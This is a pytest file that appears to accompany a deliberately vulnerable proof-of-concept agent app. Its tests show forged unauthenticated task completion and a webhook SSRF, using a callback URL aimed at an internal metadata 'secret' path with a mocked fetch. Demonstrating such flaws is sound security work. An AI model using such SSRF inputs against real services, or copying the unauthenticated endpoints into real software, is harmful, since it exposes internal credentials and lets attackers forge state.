from starlette.testclient import TestClient

from pocs.webhook_ssrf.agent import TASKS, vulnerable_app


def test_unauthenticated_completion_is_accepted():
    TASKS.clear()
    TASKS["t1"] = "working"
    client = TestClient(vulnerable_app())
    resp = client.post("/tasks/t1/complete", json={"status": "completed"})
    assert resp.status_code == 200
    assert TASKS["t1"] == "completed"  # forged completion accepted


def test_webhook_fetches_arbitrary_url(monkeypatch):
    TASKS.clear()
    TASKS["t1"] = "working"
    fetched = {}

    def fake_get(url, timeout):
        fetched["url"] = url

        class R:
            text = "SECRET=hunter2"

        return R()

    monkeypatch.setattr("pocs.webhook_ssrf.agent.httpx.get", fake_get)
    client = TestClient(vulnerable_app())
    resp = client.post(
        "/tasks/t1/webhook",
        json={"callback_url": "http://127.0.0.1:9999/latest/meta-data/secret"},
    )
    assert resp.status_code == 200
    assert fetched["url"].endswith("/latest/meta-data/secret")  # SSRF reached target
